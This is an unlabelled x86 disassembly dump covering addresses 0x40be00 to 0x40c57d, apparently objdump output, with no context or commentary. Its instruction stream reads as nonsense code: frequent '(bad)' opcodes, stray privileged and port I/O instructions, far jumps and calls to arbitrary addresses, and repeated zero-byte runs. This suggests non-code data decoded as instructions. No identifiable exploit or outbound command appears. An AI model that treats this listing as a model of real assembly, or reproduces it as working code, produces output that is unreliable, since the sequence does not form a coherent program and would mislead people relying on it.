  40be00:	mov    bl,0x12
  40be02:	lods   al,BYTE PTR ds:[esi]
  40be03:	adc    ecx,esp
  40be05:	add    eax,0x791244c6
  40be0a:	inc    BYTE PTR [edx+0x9737844]
  40be10:	jmp    0x45:0xfeec1378
  40be17:	pop    ebx
  40be18:	lahf   
  40be19:	outs   dx,DWORD PTR ds:[esi]
  40be1a:	add    dh,BYTE PTR [eax]
  40be1c:	fmul   QWORD PTR [ebx+eax*8+0x55]
  40be20:	push   edi
  40be21:	imul   ecx,DWORD PTR [edi-0x7d],0x55fe79e9
  40be28:	popa   
  40be29:	inc    edx
  40be2a:	adc    BYTE PTR [eax-0x3d],dl
  40be2d:	loope  0x40be3a
  40be2f:	xor    ecx,DWORD PTR [edx+edi*2-0x1a5b03b5]
  40be36:	cmc    
  40be37:	call   ebx
  40be39:	jnp    0x40be29
  40be3b:	test   DWORD PTR [ebp-0x2f],esi
  40be3e:	cmp    cl,BYTE PTR [edx]
  40be40:	mov    ds:0x9ee7b856,al
  40be45:	aam    0xb4
  40be47:	(bad)  
  40be48:	sahf   
  40be49:	mov    bl,0x87
  40be4b:	inc    esp
  40be4c:	mov    DWORD PTR [edi+eax*2],esp
  40be4f:	or     BYTE PTR [eax],al
  40be51:	add    BYTE PTR [eax],al
  40be53:	add    BYTE PTR [eax],al
  40be55:	in     al,dx
  40be56:	call   0x54c0:0x721bc587
  40be5d:	(bad)  
  40be5e:	jle    0x40beb2
  40be60:	push   esi
  40be61:	dec    BYTE PTR [edx+0x4ea38b4c]
  40be67:	aas    
  40be68:	or     al,0xc5
  40be6a:	mov    BYTE PTR [esi],ch
  40be6c:	or     dh,bh
  40be6e:	pop    ebx
  40be6f:	mov    ch,cl
  40be71:	pop    ebp
  40be72:	lds    ebp,FWORD PTR [esi+edi*8-0x3c0ddbe]
  40be79:	mul    BYTE PTR [edx]
  40be7b:	mov    ch,0x74
  40be7d:	(bad)  
  40be7e:	fnstenv es:[eax+edi*2+0x1e]
  40be83:	mov    ch,0x74
  40be85:	ins    BYTE PTR es:[edi],dx
  40be86:	inc    eax
  40be87:	out    dx,al
  40be88:	out    0xde,eax
  40be8a:	push   ebx
  40be8b:	mov    ch,0xfe
  40be8d:	push   esp
  40be8e:	mov    cl,0x85
  40be90:	dec    ebx
  40be91:	outs   dx,BYTE PTR ds:[esi]
  40be92:	popf   
  40be93:	stos   BYTE PTR es:[edi],al
  40be94:	in     eax,dx
  40be95:	pavgb  mm6,QWORD PTR [edx+ecx*4+0x5e54e7b0]
  40be9d:	mov    esp,0xd98b4edb
  40bea2:	imul   edi,DWORD PTR [edi+0x64],0x8d4c9ae1
  40bea9:	xor    bl,cl
  40beab:	push   edx
  40beac:	dec    DWORD PTR [eax-0x61]
  40beaf:	test   DWORD PTR [ecx+ecx*8+0x2],eax
  40beb3:	and    al,0xf6
  40beb5:	ret    0x879f
  40beb8:	out    dx,eax
  40beb9:	add    BYTE PTR [eax],al
  40bebb:	add    BYTE PTR [eax],al
  40bebd:	add    al,dh
  40bebf:	add    edi,ebx
  40bec1:	cmp    bh,BYTE PTR [edi-0x4f]
  40bec4:	push   ebx
  40bec5:	mov    eax,0xb4c18492
  40beca:	mov    ds:0x3188e09c,eax
  40becf:	scas   al,BYTE PTR es:[edi]
  40bed0:	jno    0x40bf18
  40bed2:	jge    0x40bf4f
  40bed4:	out    0x88,eax
  40bed6:	mov    al,0x4f
  40bed8:	mov    al,ds:0xc0f783c0
  40bedd:	mov    ?,WORD PTR es:[eax+0x588129a5]
  40bee4:	xchg   ecx,eax
  40bee5:	pop    ecx
  40bee6:	pop    ecx
  40bee7:	mov    al,0x95
  40bee9:	ror    bl,0x7b
  40beec:	nop
  40beed:	sbb    BYTE PTR [ebx-0x50],0xfb
  40bef1:	pop    es
  40bef2:	push   edx
  40bef3:	aaa    
  40bef4:	lds    ecx,FWORD PTR [ebx]
  40bef6:	dec    edx
  40bef7:	push   ss
  40bef8:	pop    ecx
  40bef9:	adc    DWORD PTR [ebp-0xe449dfe],esi
  40beff:	scas   eax,DWORD PTR es:[edi]
  40bf00:	out    0xeb,al
  40bf02:	pushf  
  40bf03:	add    dh,BYTE PTR [esi-0x719594c]
  40bf09:	sub    ecx,DWORD PTR [esi+ebp*4]
  40bf0c:	call   0xff26cc14
  40bf11:	add    dh,BYTE PTR [ebp+0x79]
  40bf14:	out    0x7e,al
  40bf16:	retf   0xd836
  40bf19:	push   ebx
  40bf1a:	in     al,dx
  40bf1b:	xor    ch,ah
  40bf1d:	mov    ah,0x61
  40bf1f:	sahf   
  40bf20:	cli    
  40bf21:	inc    ebx
  40bf22:	add    BYTE PTR [eax],al
  40bf24:	add    BYTE PTR [eax],al
  40bf26:	add    BYTE PTR [ebp+0x79],dh
  40bf29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf2a:	or     esp,DWORD PTR ds:0xa7010202
  40bf30:	ret    0xc1ad
  40bf33:	jbe    0x40bf37
  40bf35:	adc    ah,bh
  40bf37:	pop    eax
  40bf38:	add    DWORD PTR [eax],0xffffffe1
  40bf3b:	inc    esi
  40bf3c:	adc    DWORD PTR [eax],eax
  40bf3e:	(bad)  
  40bf3f:	cmc    
  40bf40:	mov    bh,0x26
  40bf42:	jne    0x40bfb1
  40bf44:	sub    BYTE PTR [ebx+0x53645e1],al
  40bf4a:	inc    edi
  40bf4b:	cld    
  40bf4c:	outs   dx,DWORD PTR ds:[esi]
  40bf4d:	je     0x40bf2f
  40bf4f:	or     BYTE PTR [esi+0x58],0x47
  40bf53:	sbb    BYTE PTR [ecx],al
  40bf55:	sub    DWORD PTR [ebx-0x1774d785],0x5c
  40bf5c:	jns    0x40bf5f
  40bf5e:	push   0xffffffbb
  40bf60:	add    DWORD PTR [ebx-0x49008c58],eax
  40bf66:	call   0x15004507
  40bf6b:	xor    eax,0xe00fbff4
  40bf70:	add    ebx,eax
  40bf72:	bound  esi,QWORD PTR [ebp+0x529203e6]
  40bf78:	jns    0x40bf7a
  40bf7a:	mov    ebp,0xb5093348
  40bf7f:	jne    0x40bfb7
  40bf81:	add    eax,0x71bd4a28
  40bf86:	pop    eax
  40bf87:	mov    dl,0xc2
  40bf89:	sub    ah,BYTE PTR [ebp+0x0]
  40bf8f:	add    BYTE PTR [edx],dl
  40bf91:	add    edi,DWORD PTR [ebx]
  40bf93:	daa    
  40bf94:	pop    ebp
  40bf95:	push   ss
  40bf96:	lea    edi,[eax-0x452a148f]
  40bf9c:	adc    ch,BYTE PTR [edi]
  40bf9e:	cmp    esp,ebp
  40bfa0:	dec    ebp
  40bfa1:	pop    es
  40bfa2:	xor    bl,0x0
  40bfa5:	add    ah,BYTE PTR ss:[edx-0x45]
  40bfa9:	inc    ecx
  40bfaa:	mov    esi,esi
  40bfac:	mov    eax,0x6bb40002
  40bfb1:	fwait
  40bfb2:	add    BYTE PTR ds:0x625653dd,0x20
  40bfb9:	mov    ch,0x45
  40bfbb:	add    al,bl
  40bfbd:	adc    dl,BYTE PTR [edi+0x74]
  40bfc0:	out    dx,al
  40bfc1:	or     al,0x20
  40bfc3:	push   esi
  40bfc4:	pop    ecx
  40bfc5:	cmp    eax,edx
  40bfc7:	push   eax
  40bfc8:	je     0x40c037
  40bfca:	call   0x63c85bce
  40bfcf:	in     al,dx
  40bfd0:	mov    ebx,0xcb33d9b7
  40bfd5:	popf   
  40bfd6:	pop    esp
  40bfd7:	adc    BYTE PTR [edx-0x58],al
  40bfda:	mov    DWORD PTR [esi-0x78],eax
  40bfdd:	pop    es
  40bfde:	(bad)  
  40bfdf:	mov    DWORD PTR [ecx-0x2e],edx
  40bfe2:	mov    DWORD PTR [esi-0x64],eax
  40bfe5:	iret   
  40bfe6:	lds    ecx,FWORD PTR [ebp+0x4587d659]
  40bfec:	cld    
  40bfed:	mov    DWORD PTR [edi+edi*8-0x3f7d8ef5],edi
  40bff4:	add    BYTE PTR [eax],al
  40bff6:	add    BYTE PTR [eax],al
  40bff8:	add    BYTE PTR [ecx+0x6a3b4700],al
  40bffe:	push   ss
  40bfff:	jb     0x40bfdf
  40c001:	lds    edx,FWORD PTR [ebx+0x14]
  40c004:	mov    DWORD PTR [edx-0x2],ebp
  40c007:	jmp    0x1303:0xe83ad741
  40c00e:	das    
  40c00f:	jge    0x40c025
  40c011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c012:	cmp    ebx,DWORD PTR [eax]
  40c014:	mov    al,0x1d
  40c016:	lea    esi,[edx]
  40c018:	xor    ecx,DWORD PTR [esp+esi*4-0x3]
  40c01c:	mov    edx,edx
  40c01e:	adc    eax,0x9e4c4589
  40c023:	inc    esp
  40c024:	or     BYTE PTR [ebx],bl
  40c026:	xchg   bl,bh
  40c028:	add    BYTE PTR [edx+eax*1],cl
  40c02b:	xor    ecx,ecx
  40c02d:	int    0x2e
  40c02f:	dec    esp
  40c030:	hlt    
  40c031:	gs inc edx
  40c033:	clc    
  40c034:	mov    ebx,DWORD PTR [edx]
  40c036:	push   es
  40c037:	mov    bl,BYTE PTR [esi*2+0x601deca3]
  40c03e:	test   al,0xed
  40c040:	jge    0x40c0a7
  40c042:	mov    ah,0x87
  40c044:	int3   
  40c045:	jne    0x40bfe2
  40c047:	add    cl,BYTE PTR [ecx-0x400b2cbd]
  40c04d:	sbb    bh,BYTE PTR [ebp+0x4d]
  40c050:	leave  
  40c051:	mov    dh,0xe1
  40c053:	push   ecx
  40c054:	add    DWORD PTR [edx+0x27],edi
  40c057:	test   al,0xff
  40c059:	mov    ds:0x7deb9b,al
  40c05e:	add    BYTE PTR [eax],al
  40c060:	add    BYTE PTR [eax],al
  40c062:	test   DWORD PTR [edi-0x64],edx
  40c065:	mov    al,BYTE PTR [ebx-0x49]
  40c068:	jl     0x40c07d
  40c06a:	jp     0x40c09c
  40c06c:	inc    edx
  40c06d:	sbb    al,0xed
  40c06f:	push   cs
  40c070:	mov    cl,0xf5
  40c072:	mov    ah,0xcf
  40c074:	ss inc edx
  40c076:	imul   ebx,DWORD PTR [edx-0x5],0x73
  40c07a:	mov    BYTE PTR [esi],bl
  40c07c:	cmp    eax,0xa91f5bf
  40c081:	ja     0x40c0f9
  40c083:	sbb    eax,ebp
  40c085:	pop    ds
  40c086:	add    cl,dh
  40c088:	jo     0x40c109
  40c08a:	dec    esp
  40c08b:	mov    ds:0x58f50537,al
  40c090:	jecxz  0x40c07c
  40c092:	nop
  40c093:	and    edx,DWORD PTR [edi-0x1]
  40c096:	push   ds
  40c097:	push   es
  40c098:	add    DWORD PTR [esi+0x14af6b36],edi
  40c09e:	int    0xae
  40c0a0:	inc    edx
  40c0a1:	add    bh,ch
  40c0a3:	repnz add BYTE PTR [esi-0xabbb48],bh
  40c0aa:	pusha  
  40c0ab:	xchg   ebx,eax
  40c0ac:	pop    ss
  40c0ad:	inc    eax
  40c0ae:	jne    0x40c0d3
  40c0b0:	inc    edi
  40c0b1:	(bad)  
  40c0b2:	out    dx,al
  40c0b3:	gs mov dl,0x89
  40c0b6:	dec    eax
  40c0b7:	add    ah,BYTE PTR [esi]
  40c0b9:	out    dx,al
  40c0ba:	int3   
  40c0bb:	xor    eax,0xe38b9bf
  40c0c0:	jmp    0x40c0f9
  40c0c2:	out    dx,al
  40c0c3:	adc    DWORD PTR [ecx],0xfe
  40c0c9:	add    BYTE PTR [eax],al
  40c0cb:	dec    ecx
  40c0cc:	out    0x68,al
  40c0ce:	scas   al,BYTE PTR es:[edi]
  40c0cf:	jns    0x40c108
  40c0d1:	fidivr WORD PTR [ecx+esi*1-0x56]
  40c0d5:	mov    cl,0x41
  40c0d7:	gs std 
  40c0d9:	imul   esi,DWORD PTR [edi],0x7ce5acb2
  40c0df:	cmp    dh,bh
  40c0e1:	and    BYTE PTR [eax+0x5c],dl
  40c0e4:	add    esp,esi
  40c0e6:	xchg   BYTE PTR [edx],dl
  40c0e8:	lods   eax,DWORD PTR ds:[esi]
  40c0e9:	int    0xb0
  40c0eb:	cmp    ebp,DWORD PTR [ebp-0x236053d5]
  40c0f1:	push   0x6bfd6cad
  40c0f6:	dec    edx
  40c0f7:	jp     0x40c0a5
  40c0f9:	lods   eax,DWORD PTR ds:[esi]
  40c0fa:	sub    DWORD PTR [edi-0x2],0xfffffff5
  40c0fe:	xchg   BYTE PTR [edx-0x104f6255],bh
  40c104:	cmp    eax,0xfaa8ec9d
  40c109:	fld    QWORD PTR [esi+esi*4-0x4f7a55]
  40c110:	cmp    al,0xe5
  40c112:	jmp    0x40c0ba
  40c114:	add    eax,ebp
  40c116:	add    al,dh
  40c118:	rep ins DWORD PTR es:[edi],dx
  40c11a:	mov    al,0x33
  40c11c:	inc    ebx
  40c11d:	inc    si
  40c11f:	and    DWORD PTR [esi+ebx*2+0x46],eax
  40c123:	sbb    eax,0x21465643
  40c128:	jp     0x40c0cd
  40c12a:	mov    bl,0x4f
  40c12c:	inc    esp
  40c12d:	icebp  
  40c12e:	add    BYTE PTR [eax],al
  40c130:	add    BYTE PTR [eax],al
  40c132:	add    BYTE PTR [eax],al
  40c134:	lock (bad) 
  40c136:	cmp    eax,0xfff003b0
  40c13b:	sub    BYTE PTR [ebp+eax*2+0x2d6fe81c],bh
  40c142:	sbb    BYTE PTR [ebp-0x682185e],bl
  40c148:	jne    0x40c0e0
  40c14a:	mov    edi,0xfeab7400
  40c14f:	push   cs
  40c150:	push   ecx
  40c151:	dec    ebp
  40c152:	or     BYTE PTR [ebx+0x34],dh
  40c155:	add    DWORD PTR [ebx+0x3b427a97],ecx
  40c15b:	sub    al,BYTE PTR [ecx+0x78dd3803]
  40c161:	mul    BYTE PTR ss:[edx]
  40c164:	mov    dh,0x36
  40c166:	or     BYTE PTR [edx+0x3b],dh
  40c169:	adc    ch,cl
  40c16b:	popf   
  40c16c:	retf   
  40c16d:	lods   al,BYTE PTR ds:[esi]
  40c16e:	inc    BYTE PTR [ebx-0x67]
  40c171:	push   ebp
  40c172:	lea    esi,[ecx+eiz*4]
  40c175:	push   edx
  40c176:	call   0xfeeda376
  40c17b:	call   0x246997ad
  40c180:	inc    ecx
  40c181:	jp     0x40c200
  40c183:	add    DWORD PTR [esi],ecx
  40c185:	fimul  DWORD PTR [edx-0x39008ad9]
  40c18b:	pusha  
  40c18c:	lods   al,BYTE PTR ds:[esi]
  40c18d:	into   
  40c18e:	mov    ah,BYTE PTR [edi]
  40c190:	imul   edx,edi,0xd2b474c6
  40c196:	mov    BYTE PTR [eax+eax*1],ah
  40c199:	add    BYTE PTR [eax],al
  40c19b:	add    BYTE PTR [eax],al
  40c19d:	sbb    DWORD PTR [ebx-0x53f588d8],esp
  40c1a3:	mov    bl,BYTE PTR [ecx+edx*1]
  40c1a6:	add    bh,cl
  40c1a8:	jo     0x40c215
  40c1aa:	or     al,BYTE PTR [ecx+ebp*1+0x57778622]
  40c1b1:	retf   0x46ab
  40c1b4:	adc    ah,BYTE PTR [ebx+0x12]
  40c1b7:	jb     0x40c1b9
  40c1b9:	outs   dx,BYTE PTR ds:[esi]
  40c1ba:	lea    esp,[ecx+0x3e5b43fe]
  40c1c0:	jmp    0x3e1e68
  40c1c5:	push   edi
  40c1c6:	inc    esp
  40c1c7:	or     al,0x85
  40c1c9:	pushf  
  40c1ca:	jmp    0x100c:0x9835006
  40c1d1:	or     al,0xff
  40c1d3:	mov    al,dh
  40c1d5:	jne    0x40c182
  40c1d7:	repz add esp,ebx
  40c1da:	push   esp
  40c1db:	mov    esi,eax
  40c1dd:	fs xchg esi,eax
  40c1df:	repnz add esp,ecx
  40c1e2:	cmp    BYTE PTR [esi-0x72ac188c],0x7e
  40c1e9:	mov    al,ds:0xcc850627
  40c1ee:	repnz push es
  40c1f0:	push   eax
  40c1f1:	ret    
  40c1f2:	or     DWORD PTR [eax+edx*1],ecx
  40c1f5:	pop    esp
  40c1f6:	push   es
  40c1f7:	cmp    DWORD PTR [eax+edi*2+0x2],0x0
  40c1fc:	je     0x40c26a
  40c1fe:	push   ebx
  40c1ff:	push   0x0
  40c201:	add    BYTE PTR [eax],al
  40c203:	add    BYTE PTR [eax],al
  40c205:	add    BYTE PTR [esi],dh
  40c207:	push   es
  40c208:	push   0x65d14
  40c20d:	dec    DWORD PTR [eax+0x4aff1a9a]
  40c213:	pop    ecx
  40c214:	adc    ecx,DWORD PTR [eax]
  40c216:	pop    esp
  40c217:	inc    esi
  40c218:	add    BYTE PTR [ebp+0x2105eb1c],al
  40c21e:	pop    ebx
  40c21f:	mov    ah,0xbe
  40c221:	jmp    0x40c271
  40c223:	add    BYTE PTR ss:[edi+0x62],bl
  40c227:	les    eax,FWORD PTR [edx]
  40c229:	add    BYTE PTR [ecx-0x12ae14d3],cl
  40c22f:	sub    al,0x3f
  40c231:	or     al,0x5b
  40c233:	cmp    bh,ah
  40c235:	add    al,0x75
  40c237:	fwait
  40c238:	add    al,BYTE PTR [eax]
  40c23a:	clc    
  40c23b:	(bad)  [esi]
  40c23d:	and    al,0x9f
  40c23f:	fwait
  40c240:	jg     0x40c28e
  40c242:	add    DWORD PTR [ebx-0x7502b381],ecx
  40c248:	sbb    BYTE PTR [ecx],cl
  40c24a:	inc    ebp
  40c24b:	fcom   DWORD PTR [edi]
  40c24d:	add    al,0x85
  40c24f:	pop    ebx
  40c250:	add    al,BYTE PTR [ebp-0x7d00704b]
  40c256:	pop    eax
  40c257:	sysret 
  40c259:	jne    0x40c2d5
  40c25b:	and    al,0x48
  40c25d:	clc    
  40c25e:	sbb    eax,0x86023699
  40c263:	fisttp DWORD PTR [ebx+0x198d782]
  40c269:	ret    0x0
  40c26c:	add    BYTE PTR [eax],al
  40c26e:	add    BYTE PTR [ebx+esi*4-0x19493700],dh
  40c275:	js     0x40c262
  40c277:	inc    esi
  40c278:	xor    al,0xcc
  40c27a:	mov    dh,BYTE PTR [edx-0x6d01a33d]
  40c280:	mov    eax,0x9701d7e8
  40c285:	lock mov edi,0x5356118e
  40c28b:	jp     0x40c273
  40c28d:	sti    
  40c28e:	out    0xd0,eax
  40c290:	ret    
  40c291:	lods   al,BYTE PTR ds:[esi]
  40c292:	(bad)  
  40c293:	dec    BYTE PTR [edx-0x60170a7a]
  40c299:	lock mov edi,0x437eda4e
  40c29f:	jae    0x40c319
  40c2a1:	js     0x40c270
  40c2a3:	mov    gs,WORD PTR [ebx]
  40c2a5:	xor    DWORD PTR [edi+ebp*8],edx
  40c2a8:	leave  
  40c2a9:	jp     0x40c2ff
  40c2ab:	outs   dx,BYTE PTR ds:[esi]
  40c2ac:	and    eax,0x25848814
  40c2b1:	push   edi
  40c2b2:	or     esi,DWORD PTR [edx+eax*1-0x1252eb8f]
  40c2b9:	xor    BYTE PTR [edx],dh
  40c2bb:	or     DWORD PTR [ecx+ebp*8],ebx
  40c2be:	sbb    DWORD PTR [ebp-0x57],esi
  40c2c1:	aad    0xff
  40c2c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2c4:	push   eax
  40c2c5:	inc    esi
  40c2c6:	xor    eax,0x3d3a979
  40c2cb:	gs inc edx
  40c2cd:	jmp    0x35ea0d50
  40c2d2:	leave  
  40c2d3:	add    BYTE PTR [eax],al
  40c2d5:	add    BYTE PTR [eax],al
  40c2d7:	add    BYTE PTR [ebp+ecx*8-0x66485242],cl
  40c2de:	inc    esi
  40c2df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2e0:	fld    TBYTE PTR [eax+0x4d30c162]
  40c2e6:	lods   al,BYTE PTR ds:[esi]
  40c2e7:	shl    DWORD PTR [esi+0x2],0x9c
  40c2eb:	js     0x40c2bb
  40c2ed:	test   BYTE PTR [esp+ebp*4],al
  40c2f0:	cmc    
  40c2f1:	xchg   ebp,eax
  40c2f2:	pop    eax
  40c2f3:	add    esi,DWORD PTR [ebp+0x2]
  40c2f6:	pop    esp
  40c2f7:	or     BYTE PTR [ecx+0x52],dl
  40c2fa:	push   ecx
  40c2fb:	add    dh,BYTE PTR [edi+0x2]
  40c2fe:	jmp    0xff3f44af
  40c303:	inc    ebx
  40c304:	jne    0x40c2b7
  40c306:	mov    al,0x8
  40c308:	mov    ch,0x41
  40c30a:	jb     0x40c2b2
  40c30c:	and    ebp,eax
  40c30e:	mov    ebp,0x290ebae6
  40c313:	add    al,0x3a
  40c315:	add    DWORD PTR [ebp+0x30],ebp
  40c318:	mov    ch,0x2
  40c31a:	imul   ebp,esi,0x429ce0a
  40c320:	jne    0x40c34f
  40c322:	rcl    DWORD PTR [edx+edx*1-0x45],1
  40c326:	mov    bl,0x40
  40c328:	jne    0x40c379
  40c32a:	xchg   BYTE PTR [esi],dl
  40c32c:	imul   edx,DWORD PTR [ebx],0xe5f50429
  40c332:	call   DWORD PTR [eax+0x4b]
  40c335:	inc    ebp
  40c336:	add    cl,ch
  40c338:	arpl   WORD PTR [eax+ebp*8],cx
  40c33b:	xchg   ebp,eax
  40c33c:	add    BYTE PTR [eax],al
  40c33e:	add    BYTE PTR [eax],al
  40c340:	add    cl,dl
  40c342:	test   al,0xfe
  40c344:	gs ss xor al,0x11
  40c348:	cs jnp 0x40c2d1
  40c34b:	aam    0xaa
  40c34d:	jbe    0x40c3a5
  40c34f:	mov    dl,0xa9
  40c351:	jbe    0x40c313
  40c353:	add    al,0x61
  40c355:	and    eax,DWORD PTR [ebp+0x0]
  40c358:	call   0xd1556aa6
  40c35d:	test   DWORD PTR [edx+0x0],eax
  40c360:	(bad)  
  40c361:	pop    esp
  40c362:	inc    ebx
  40c363:	and    al,0xe5
  40c365:	cmc    
  40c366:	xor    eax,0x1df51604
  40c36b:	or     cl,ch
  40c36d:	dec    esi
  40c36e:	cmp    eax,0xde3a730c
  40c373:	pop    es
  40c374:	jno    0x40c3a6
  40c376:	cmc    
  40c377:	mov    ch,BYTE PTR [edi]
  40c379:	mov    ah,0xff
  40c37b:	call   DWORD PTR [esi-0x38184dd3]
  40c381:	jns    0x40c385
  40c383:	add    bh,dl
  40c385:	xor    eax,0x62e807de
  40c38a:	add    BYTE PTR [esi-0x3f],dl
  40c38d:	fcomp  QWORD PTR [ebp-0x42fd3902]
  40c393:	pop    ebp
  40c394:	stos   DWORD PTR es:[edi],eax
  40c395:	jne    0x40c399
  40c397:	push   ebp
  40c398:	bound  ecx,QWORD PTR ds:0x7031eb82
  40c39e:	add    al,BYTE PTR [eax]
  40c3a0:	scas   al,BYTE PTR es:[edi]
  40c3a1:	ja     0x40c409
  40c3a3:	jb     0x40c3ce
  40c3a5:	add    BYTE PTR [eax],al
  40c3a7:	add    BYTE PTR [eax],al
  40c3a9:	add    BYTE PTR [ecx-0x7e],dh
  40c3ac:	cmp    al,0x71
  40c3ae:	and    al,0x44
  40c3b0:	add    cl,ch
  40c3b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3b3:	sub    eax,0x66bb0036
  40c3b8:	rol    DWORD PTR [ebx+0x4c],cl
  40c3bb:	push   esp
  40c3bc:	call   DWORD PTR ds:0x401050
  40c3c2:	pushf  
  40c3c3:	cdq    
  40c3c4:	xchg   esi,eax
  40c3c5:	aad    0xcf
  40c3c7:	add    al,BYTE PTR [eax]
  40c3c9:	jne    0x40c441
  40c3cb:	xchg   BYTE PTR [edi+edi*8],ah
  40c3ce:	stos   DWORD PTR es:[edi],eax
  40c3cf:	pop    ebx
  40c3d0:	add    al,0x20
  40c3d3:	push   cs
  40c3d4:	mov    DWORD PTR ds:0x41d198,0x3f2ee8
  40c3de:	mov    ds:0x1fd59801,al
  40c3e3:	add    eax,DWORD PTR [ecx]
  40c3e5:	push   edi
  40c3e6:	fwait
  40c3e7:	adc    DWORD PTR [eax],ebx
  40c3e9:	adc    ecx,DWORD PTR [ebx+eax*1]
  40c3ec:	lea    eax,[ebp+0x68]
  40c3ef:	dec    esi
  40c3f0:	lea    eax,[ebp-0x2a3ac]
  40c3f6:	fmul   QWORD PTR [edx]
  40c3f8:	add    al,0x20
  40c3fa:	int3   
  40c3fb:	add    ch,BYTE PTR [eax-0x1]
  40c3fe:	stos   DWORD PTR es:[edi],eax
  40c3ff:	add    al,BYTE PTR [eax]
  40c401:	jmp    DWORD PTR [ecx]
  40c403:	stos   DWORD PTR es:[edi],eax
  40c404:	mov    ebp,0x28d74
  40c409:	mov    DWORD PTR [ecx],edi
  40c40b:	pop    edx
  40c40c:	std    
  40c40d:	adc    eax,0x0
  40c412:	add    BYTE PTR [esp+edx*1+0x40],bh
  40c416:	add    BYTE PTR [ecx],dl
  40c418:	ret    
  40c419:	jb     0x40c42e
  40c41b:	arpl   WORD PTR [ecx],bp
  40c41d:	test   BYTE PTR [eax+0x6afd5bba],cl
  40c423:	pop    esp
  40c424:	push   edx
  40c425:	call   DWORD PTR ds:0x40109c
  40c42b:	iret   
  40c42c:	or     al,BYTE PTR gs:[ebx-0x37a47]
  40c433:	jne    0x40c3c1
  40c435:	add    BYTE PTR [edi-0x3f],bl
  40c438:	test   al,0x85
  40c43a:	mov    esp,0xfea97e59
  40c43f:	fs xchg esp,eax
  40c441:	(bad)  
  40c442:	mov    edi,0x1de6433
  40c447:	std    
  40c448:	(bad)  
  40c44a:	jmp    0x3074:0xd40d579
  40c451:	adc    bl,0x13
  40c454:	dec    ebp
  40c455:	stos   BYTE PTR es:[edi],al
  40c456:	out    0x59,eax
  40c458:	call   0xfffa:0xb5f60002
  40c45f:	repnz pop ebp
  40c461:	test   BYTE PTR [edx+0x457ba338],0x71
  40c468:	and    cl,al
  40c46a:	enter  0x97b7,0x2
  40c46e:	push   esi
  40c46f:	out    dx,al
  40c470:	or     al,dl
  40c472:	add    BYTE PTR [ecx],dl
  40c474:	mov    DWORD PTR [edx+0x0],eax
  40c477:	add    BYTE PTR [eax],al
  40c479:	add    BYTE PTR [eax],al
  40c47b:	add    ch,bl
  40c47d:	sbb    al,BYTE PTR [ebx]
  40c47f:	add    BYTE PTR [ebp+0x5d],dh
  40c482:	lds    eax,FWORD PTR [edx+0x73a99f3b]
  40c488:	jbe    0x40c475
  40c48a:	add    eax,ebx
  40c48c:	jp     0x40c47b
  40c48e:	inc    eax
  40c48f:	or     eax,0x47f7472d
  40c494:	and    DWORD PTR [eax+0x41b6bff4],ebx
  40c49a:	push   es
  40c49b:	pop    ecx
  40c49c:	pop    ds
  40c49d:	stos   BYTE PTR es:[edi],al
  40c49e:	fwait
  40c49f:	add    al,0x46
  40c4a1:	jb     0x40c4e5
  40c4a3:	push   0x73
  40c4a5:	xor    DWORD PTR [edx+0xc],eax
  40c4a8:	iret   
  40c4a9:	ret    
  40c4aa:	mov    ebp,0x549b6aff
  40c4af:	push   ecx
  40c4b0:	lds    eax,FWORD PTR [edx]
  40c4b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4b3:	punpckhwd mm1,QWORD PTR [ecx+ebp*1]
  40c4b7:	add    al,0x86
  40c4b9:	mov    ebx,0x7b4bac69
  40c4be:	add    BYTE PTR es:[edx-0x71],dh
  40c4c2:	test   al,0xc5
  40c4c4:	mul    DWORD PTR [ebx]
  40c4c6:	icebp  
  40c4c7:	add    ebp,DWORD PTR [ecx-0x7ad65003]
  40c4cd:	cmc    
  40c4ce:	push   esp
  40c4cf:	les    esi,FWORD PTR [edi]
  40c4d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4d2:	sti    
  40c4d3:	adc    eax,DWORD PTR [ebx-0x478516be]
  40c4d9:	cli    
  40c4da:	imul   eax,esp,0xffffff86
  40c4dd:	loopne 0x40c494
  40c4df:	push   ebx
  40c4e0:	add    BYTE PTR [eax],al
  40c4e2:	add    BYTE PTR [eax],al
  40c4e4:	add    BYTE PTR [edx],al
  40c4e6:	sub    al,0xed
  40c4e8:	test   al,0x61
  40c4ea:	into   
  40c4eb:	rol    DWORD PTR [ebx+0x75],cl
  40c4ee:	jg     0x40c518
  40c4f0:	das    
  40c4f1:	jae    0x40c56e
  40c4f3:	scas   al,BYTE PTR es:[edi]
  40c4f4:	adc    esp,DWORD PTR ds:0x60a92a03
  40c4fa:	cli    
  40c4fb:	sbb    eax,0xa90ec90f
  40c500:	add    esi,esi
  40c502:	sbb    esp,ecx
  40c504:	add    eax,DWORD PTR [edi+0x307d29c2]
  40c50a:	(bad)  
  40c50b:	imul   ebp,DWORD PTR [ebx+esi*4+0x771ddf2d],0xb10eee52
  40c516:	push   cs
  40c517:	sub    DWORD PTR [edx+ebx*4],eax
  40c51a:	sub    esp,ebp
  40c51c:	test   al,0x69
  40c51e:	or     bh,bh
  40c520:	inc    ebx
  40c521:	jne    0x40c4a4
  40c523:	push   ds
  40c524:	add    BYTE PTR [edx-0xe03d188],al
  40c52a:	shl    DWORD PTR [edi*8-0x24005c3e],0x1a
  40c532:	cmovo  ebp,ecx
  40c535:	stc    
  40c536:	sbb    eax,0x4f31e908
  40c53b:	mov    ecx,DWORD PTR [ebp-0x17886809]
  40c541:	jbe    0x40c545
  40c543:	lea    esp,[ecx*1+0x6c8d34]
  40c54a:	add    BYTE PTR [eax],al
  40c54c:	add    BYTE PTR [eax],al
  40c54e:	mov    esi,0xc67efea5
  40c553:	sbb    al,BYTE PTR [ecx+ecx*8]
  40c556:	jbe    0x40c55a
  40c558:	push   0xfea3cd6e
  40c55d:	dec    bx
  40c55f:	cli    
  40c560:	(bad)  
  40c561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c562:	fisubr DWORD PTR [edi]
  40c564:	add    ecx,ebp
  40c566:	jbe    0x40c50b
  40c568:	adc    al,0x9
  40c56a:	addr16 inc edx
  40c56c:	add    BYTE PTR [esi+esi*1+0x2f],ch
  40c570:	or     eax,0xfdcf7372
  40c575:	ss sbb eax,0x76e91b9c
  40c57b:	add    ch,bl
  40c57d:	jmp    0x40c55f
